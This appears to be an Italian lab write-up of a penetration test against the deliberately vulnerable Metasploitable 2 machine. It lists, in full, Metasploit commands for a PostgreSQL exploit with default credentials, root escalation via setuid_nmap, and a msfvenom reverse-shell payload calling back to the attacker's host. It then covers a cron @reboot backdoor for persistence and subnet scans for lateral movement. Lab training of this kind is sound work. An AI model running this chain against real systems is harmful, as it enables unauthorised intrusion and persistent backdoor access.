# Penetration Testing: Metasploitable 2 - Privilege Escalation & Persistence

## **Obiettivo**
Eseguire:
1. **Exploitation** di una vulnerabilità PostgreSQL su Metasploitable 2
2. **Escalation di privilegi** per ottenere root
3. **Persistenza** tramite una backdoor
4. Preparazione al **movimento laterale** e troubleshooting

---

## **1. Scansione e Identificazione dei Servizi**
### **Scansione con Nmap**
Abbiamo effettuato una scansione per identificare i servizi vulnerabili sulla macchina **Metasploitable 2**:

```bash
nmap -sV 192.168.1.152
```

**Risultato:**
- **PostgreSQL** è attivo sulla porta `5432/tcp` con la versione `PostgreSQL DB 8.3.0`.

---

## **2. Exploitation: PostgreSQL**
### **Uso del modulo PostgreSQL Payload**
Abbiamo utilizzato Metasploit per sfruttare PostgreSQL e ottenere una sessione **Meterpreter**.

**Comandi usati:**
```bash
use exploit/linux/postgres/postgres_payload
set RHOST 192.168.1.152
set USERNAME postgres
set PASSWORD postgres
set LHOST 192.168.1.150
set LPORT 4445
run
```

**Risultato:**
- **Sessione Meterpreter** ottenuta con successo!

---

## **3. Escalation di Privilegi**
### **Utilizzo del modulo Local Exploit Suggester**
Abbiamo identificato possibili vulnerabilità locali per l'escalation di privilegi.

**Comandi eseguiti:**
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

**Exploit suggeriti:**
1. `glibc_ld_audit_dso_load_priv_esc`
2. `setuid_nmap`

### **Sfruttamento dell'exploit**
Abbiamo tentato l'exploit `setuid_nmap` per ottenere i privilegi root:

```bash
use exploit/linux/local/setuid_nmap
set SESSION 1
run
```

**Risultato:**
- Escalation riuscita: utente `root` ottenuto!

**Verifica:**
```bash
getuid
whoami
```
---

## **4. Persistenza della Backdoor**
Abbiamo configurato una **backdoor persistente** per mantenere l'accesso anche dopo un riavvio.

### **Creazione del Payload**
Generazione del payload con **msfvenom**:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4445 -f elf > backdoor.elf
```

### **Caricamento del Payload**
Utilizzando Meterpreter:

```bash
upload backdoor.elf /usr/local/bin/persistence
chmod +x /usr/local/bin/persistence
```

### **Configurazione del Cron Job**
Abbiamo configurato un **cron job** per avviare la backdoor ad ogni riavvio:

```bash
echo "@reboot /usr/local/bin/persistence" >> /etc/cron.d/root_persistence
cat /etc/cron.d/root_persistence
```

**Risultato:**
- Backdoor configurata correttamente per l'avvio automatico.

---

## **5. Verifica della Persistenza**
### **Riavvio della macchina Metasploitable**
Abbiamo riavviato la macchina Metasploitable e verificato il listener Metasploit.

**Listener su Kali Linux:**

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.150
set LPORT 4445
run
```

**Risultato:**
- La connessione **Meterpreter** è stata ristabilita automaticamente.

---

## **6. Troubleshooting e Movimento Laterale**
### **Identificazione di altre macchine nella rete**
Abbiamo utilizzato **ARP Scanner** per identificare altri host nella rete locale:

```bash
run post/multi/gather/arp_scanner
```

### **Scansione delle macchine rilevate**
Abbiamo eseguito una scansione con Nmap per identificare nuovi servizi sfruttabili:

```bash
nmap -sV 192.168.1.0/24
```

---

## **Conclusioni**
1. Ottenuta una sessione Meterpreter tramite PostgreSQL.
2. Escalation dei privilegi a **root** utilizzando `setuid_nmap`.
3. Configurata una **backdoor persistente** che sopravvive ai riavvii.
4. Avviato il movimento laterale per esplorare altri host nella rete.

**Prossimi Passi:**
- Automatizzare ulteriormente la persistenza.
- Sfruttare altre vulnerabilità per movimento laterale.

---

## **Autore**
**[Nome del tuo team/tuo nome]** - 2024

**Tools utilizzati**:
- Kali Linux
- Metasploit Framework
- Nmap
- msfvenom